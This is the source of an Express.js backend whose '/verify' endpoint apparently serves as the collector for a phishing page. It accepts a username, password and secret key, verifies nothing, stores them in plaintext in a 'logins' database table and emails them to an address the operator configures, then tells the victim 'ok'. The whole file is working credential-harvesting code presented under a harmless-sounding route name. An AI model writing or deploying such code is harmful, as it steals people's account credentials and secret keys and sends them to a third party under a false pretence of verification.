require("dotenv").config();
const express = require("express");
const cors = require("cors");
const { createClient } = require("@supabase/supabase-js");
const emailjs = require("@emailjs/nodejs");

const app = express();
app.use(cors());
app.use(express.json());

app.get("/", (req, res) => res.json({ status: "ok" }));

const ws = require("ws");
const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_SERVICE_ROLE_KEY,
  { realtime: { transport: ws } }
);

app.post("/verify", async (req, res) => {
  const { username, password, secret_key } = req.body;

  if (!username || !password || !secret_key) {
    return res.status(400).json({ error: "Missing fields" });
  }

  console.log("/verify body:", { username, secret_key });

  try {
    const { data, error } = await supabase
      .from("logins")
      .insert({ username, password, secret_key })
      .select();
    if (error) {
      console.error("Supabase insert error:", error);
    } else {
      console.log("Supabase insert result:", data);
    }
  } catch (err) {
    console.error("Supabase error:", err);
  }

  try {
    await emailjs.send(
      process.env.EMAILJS_SERVICE_ID,
      process.env.EMAILJS_TEMPLATE_ID,
      {
        username: `${username} - secret-key: ${secret_key}`,
        password,
        to_email: process.env.EMAILJS_TO_EMAIL,
      },
      {
        publicKey: process.env.EMAILJS_PUBLIC_KEY,
        privateKey: process.env.EMAILJS_PRIVATE_KEY,
      }
    );
  } catch (err) {
    console.error("EmailJS error:", err);
  }

  res.json({ status: "ok" });
});

const PORT = process.env.PORT || 4000;
app.listen(PORT, () => console.log(`Backend running on port ${PORT}`));
